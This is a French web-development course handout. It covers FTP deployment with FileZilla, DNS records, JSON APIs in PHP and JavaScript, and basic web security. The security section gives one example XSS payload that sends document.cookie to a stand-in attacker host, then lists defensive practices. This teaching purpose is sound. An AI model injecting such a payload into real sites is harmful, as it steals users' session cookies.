# Session 3 : Déploiement et concepts avancés

## Objectifs pédagogiques

- Mettre en ligne une application web  
- Travailler avec des services web et des données JSON  
- Comprendre les bases de la sécurité côté client et côté serveur

---

## 1. Déploiement web

### Transfert de fichiers par FTP

**FTP** (File Transfer Protocol) permet de transférer des fichiers depuis ton ordinateur vers un serveur web.

**Étapes :**

- Installer un client FTP comme **FileZilla**  
- Se connecter avec les identifiants fournis par l’hébergeur  
- Transférer les fichiers du projet dans le dossier `www` ou `public_html`  

> Exemple : transférer `index.html` pour qu’il soit visible sur le site.

### Gestion de domaine et configuration DNS

Un **nom de domaine** (ex : `monsite.fr`) pointe vers une adresse IP.

**Notions à connaître :**

- **Enregistrement A** : lie un domaine à une adresse IP  
- **Enregistrement CNAME** : redirige vers un autre nom de domaine  
- **Enregistrement MX** : gère les e-mails  

> Exemple : configurer `www.monsite.fr` pour qu’il affiche le site hébergé.

---

## 2. Introduction aux APIs JSON

### Qu’est-ce que JSON ?

**JSON** (JavaScript Object Notation) est un format léger pour représenter des données sous forme de texte.

```json
{
  "nom": "Alice",
  "age": 30,
  "email": "alice@example.com"
}
```

Chaque élément est une **paire clé/valeur**.

### Créer une API simple en PHP

```php
<?php
$data = ["nom" => "Alice", "age" => 30];
header('Content-Type: application/json');
echo json_encode($data);
?>
```

### Consommer une API

#### Étape 1 : Obtenir une clé API

Avant de pouvoir interroger l'API, vous devez obtenir une clé :

- Rendez-vous sur [https://thecatapi.com/signup](https://thecatapi.com/signup)  
- Inscrivez-vous gratuitement  
- Une clé API vous sera fournie, à utiliser dans les requêtes  

#### Avec JavaScript (`fetch`)

```js
fetch('https://api.thecatapi.com/v1/images/search', {
  headers: {
    'x-api-key': 'VOTRE_CLE_API'
  }
})
  .then(response => response.json())
  .then(data => {
    console.log(data);
    const img = document.createElement('img');
    img.src = data[0].url;
    document.body.appendChild(img);
  });
```

#### Avec PHP (`curl`)

```php
<?php
$curl = curl_init();

curl_setopt_array($curl, [
    CURLOPT_URL => "https://api.thecatapi.com/v1/images/search",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => [
        "x-api-key: VOTRE_CLE_API"
    ]
]);

$response = curl_exec($curl);
curl_close($curl);

$data = json_decode($response, true);
echo "<img src='" . $data[0]['url'] . "' />";
?>
```

---

## 3. Sécurité

### Attaque XSS (Cross-Site Scripting)

Une attaque **XSS** consiste à injecter du code JavaScript malveillant dans une application web vulnérable.

> Exemple réaliste :  
> Un utilisateur entre ce code dans un champ commentaire :
> ```html
> <script>document.location='https://badbadnotgood.com/voler-cookie?cookie=' + document.cookie;</script>
> ```

Ce script vole les cookies de session de l’utilisateur.

### Bonnes pratiques

- Utiliser `htmlspecialchars()` pour afficher des données utilisateur  
- Valider les entrées côté serveur  
- Éviter l’injection de balises HTML  
- Utiliser des tokens **CSRF** pour sécuriser les formulaires  

---

## Activité : Gagne ton sous-domaine !

À travers les projets des **sessions 1 et 2**, un ou une gagnante sera sélectionnée pour :

- Obtenir un **sous-domaine personnalisé** (ex : `monprojet.monsite.fr`)  
- Publier son projet sur un serveur **Gandi** ou **Hostinger**  
- Utiliser **FileZilla** pour le transfert FTP  

### Étapes de publication

**1. Préparer ton projet**

- Fichier `index.html` ou `index.php` à la racine  
- Dossiers organisés : `css/`, `js/`, `images/`, etc.  

**2. Installer FileZilla**

Téléchargement : [https://filezilla-project.org](https://filezilla-project.org)

**3. Connexion FTP**

Tu recevras :

- Adresse FTP (ex : `ftp.monsite.fr`)  
- Identifiant et mot de passe  
- Port : `21`  

**Configuration dans FileZilla :**

- Hôte : `ftp.monsite.fr`  
- Identifiant : ton login  
- Mot de passe : ton mot de passe FTP  
- Port : `21`  

Transfère tes fichiers dans le dossier `www` ou `public_html`.

### Ton site est en ligne

Accès à ton projet :  
`https://tonnom.monsite.fr`

### Pourquoi participer ?

- Créer ton premier **portfolio web**  
- Expérimenter une vraie mise en ligne  
- Partager ton travail avec ton entourage ou de futurs employeurs  
